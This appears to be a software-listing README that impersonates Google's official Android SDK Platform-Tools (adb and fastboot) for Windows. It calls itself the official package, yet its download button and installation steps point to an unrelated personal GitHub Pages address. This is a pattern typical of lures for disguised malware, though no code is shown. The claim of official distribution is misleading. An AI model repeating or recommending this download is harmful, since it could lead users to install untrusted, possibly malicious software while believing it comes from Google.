# ADB Platform Tools

<img src="https://play-lh.googleusercontent.com/LE2-8hjLVmfDhjBtFoLrJThiqRyT68O1jCKE9ZQWUGOGHGBq9BETGvrMzeOZijpE_B6WK5tCD-lEp8ezL3BogBg=w240-h480-rw" alt="ADB Platform Tools logo" width="120"/>

[![Download ADB Platform Tools](https://img.shields.io/badge/⬇_Download_ADB_Platform_Tools-2962FF?style=for-the-badge)](https://edwardwhite23.github.io/.github/ADB-Platform-Tools-App)

ADB Platform Tools is an official Android developer toolkit for Windows that gives you the adb and fastboot command-line utilities for debugging, sideloading apps, and managing Android devices from your PC.

![Platform](https://img.shields.io/badge/Platform-Windows-2962FF) ![Category](https://img.shields.io/badge/Category-Android%20Developer%20Tools-2962FF) ![Release](https://img.shields.io/badge/Release-Latest%20SDK%20Build-2962FF) ![License](https://img.shields.io/badge/License-Free-4c1)

## Quick Facts

| | |
|---|---|
| **Platform** | Windows 10/11, 64-bit |
| **Category** | Android SDK command-line developer toolkit |
| **Current Release** | The latest Android SDK Platform-Tools build Google distributes |
| **Download** | Available via the button above |
| **Best For** | Developers, testers, and advanced users who need adb and fastboot on Windows |

> **Tip:** Add the extracted folder to your Windows PATH so you can run `adb` and `fastboot` from any Command Prompt or PowerShell window.

<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRLMfnwQJgbIJYYl3sQws3tzfgjquiGf5G6VkQxzuDeELDkzPSZJ4VPkQ41&s=10" alt="ADB Platform Tools running on Windows" width="100%"/>
*A Command Prompt session showing adb platform tools connected to an Android device.*

## Overview
Platform tools adb utilities are packaged by Google specifically so Windows users can talk to Android hardware from a terminal, and ADB Platform Tools for Windows is exactly that official package. It bundles adb (Android Debug Bridge), fastboot, and a handful of supporting binaries used to install apps, read device logs, and reboot a device into different modes. Rather than a traditional windowed program, it's a small folder of command-line executables you run directly, which keeps it fast and dependency-light. Google updates it alongside each Android SDK release, so it stays current with the newest Android versions.

## Features
| Feature | What it does for you |
|---|---|
| adb (Android Debug Bridge) | Install and uninstall apps, copy files, and run shell commands on a connected device |
| fastboot support | Flash factory images, partitions, and unlock tokens on a device in bootloader mode |
| Live log access | Stream `logcat` output to diagnose app or system behavior in real time |
| Device shell access | Open an interactive shell on the device for deeper inspection |
| Screen capture commands | Grab screenshots or screen recordings straight from the command line |

## System Requirements
| Component | Requirement |
|---|---|
| OS | Windows 10, 64-bit, or later |
| Processor | Any modern 64-bit processor capable of running Windows 10/11 |
| Memory | Whatever your version of Windows itself requires |
| Storage | A very small amount of free disk space for the tool itself |

## Installation
1. Click the download button above to get the ADB Platform Tools archive for Windows.
2. Extract the ZIP file to a folder you'll remember, such as `C:\platform-tools`.
3. Open a Command Prompt or PowerShell window inside that folder to start running `adb` and `fastboot` commands.

## Getting Started
Before anything else, enable Developer Options on your Android device and turn on USB debugging, then connect it to your PC with a USB cable. From the platform-tools folder, run `adb devices` to confirm Windows can see your phone or tablet, accepting the on-device authorization prompt the first time. From there you can install an APK with `adb install`, pull files with `adb pull`, or reboot into `fastboot` mode when you need to work with device images.

## FAQ
- [ ] **Is ADB Platform Tools free?** — Yes. Google distributes it at no cost as part of the official Android SDK.
- [ ] **Do I need to install anything extra on Windows?** — You may need your device manufacturer's USB driver so Windows recognizes the device; the tools themselves need no separate installer.
- [ ] **Is this the same as the full Android Studio?** — No. It's just the command-line adb and fastboot utilities, useful if you don't need the full IDE.

## Support
For help with ADB Platform Tools, check the documentation and release notes Google publishes alongside the Android SDK, which cover common adb and fastboot commands and troubleshooting steps. The official Android developer website is also a good source for setup guides and the latest usage information.
